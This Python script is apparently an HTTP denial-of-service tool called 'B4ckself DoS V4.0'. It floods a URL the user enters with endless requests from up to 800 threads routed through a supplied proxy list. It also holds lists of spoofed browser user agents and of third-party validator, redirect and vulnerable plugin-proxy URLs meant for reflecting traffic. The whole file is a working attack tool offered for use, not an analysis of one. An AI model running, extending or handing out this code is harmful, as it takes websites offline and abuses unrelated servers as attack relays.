import urllib.request, os, threading, time, random, sys

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Googlebot/2.1 (+http://www.google.com/bot.html)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
	uagent.append("Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1")
	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41")
	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://validator.w3.org/feed/check.cgi?url=")
	bots.append("http://www.google.com/ig/adde?moduleurl=")
	bots.append("http://www.google.com/?q=")
	bots.append("http://www.google.com/ig/adde?moduleurl=")
	bots.append("http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=")
	bots.append("https://down.com/?q=")
	bots.append("http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=")
	bots.append("http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://www.feedvalidator.org/check.cgi?url=")
	bots.append("https://www.wizards.com/leaving.asp?url=")
	bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
	bots.append("http://feed.informer.com/validator/check.cgi?url=")
	bots.append("http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=")
	bots.append("https://html5.validator.nu/?doc=")
	return(bots)


class Spammer(threading.Thread):
   
    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36' }
        self.Lock = threading.Lock()
        self.proxy = proxy
 
 
    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener)
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        sys.stdout.write("Thread #%s Proxy@%s"%(self.num, self.proxy))
           
    def run(self):
        global Close, Request, Tot_req
        self.Lock.acquire()
        print ('Starting thread #{0}'.format(self.num))
        self.Lock.release()
        time.sleep(1)
        while True:
            try:
                self.request()
            except:
                sys.stdout.write("Thread #%s Connection Proxy Lost...exiting\n"%(self.num))
                sys.exit(0)
        sys.exit(0)
 
 
class MainLoop():
       
 
 
    def check_url(self, url):
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
        return url
 
 
    def home(self):
        global Close, Request, Tot_req
        if os.name in ("nt", "dos", "ce"):
            os.system('title       ........:::::   B4ckself DoS V4.0   :::::........        Python 3.3.3')
            os.system('color a')
            color = ['a', 'b', 'c', 'd', 'e', 'f']
            os.system('color %s' % (color[random.randrange(0, 5, 1)]))            
        print ('\n                     ###################################\n')
        print ('                 01010o.....::B4ckself DoS V4.0::.....o01010\n')
        print ('              #################################################')
        print ('\n\t  A DoS Concept for HTTP site, Coded by B4ckdoor skype: b4ckdoor.porn\n')
        print ('\t                ProxyHandling by Sikh887             \n\n')
        while True:        
            url = input('> Enter Url to DoS: ')
            url = self.check_url(url)
            try:
                req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'})
                response = urllib.request.urlopen(req)
                break
            except:
                print ('> Could not open specified url.')
        try:
            lista = str(input('> Enter the list of proxy: '))
            in_file = open(lista,"r")
        except:
            print ('Error to read file.')
        try:
            num_threads = int(input('> Enter the number of thread [800]: '))
        except:
            num_threads = 800
 
 
        for i in range(num_threads):
            in_line = in_file.readline()
            Spammer(url, i + 1, in_line).start()
            in_line = in_line[:-1]
       
if __name__ == '__main__':
    MainLoop().home()
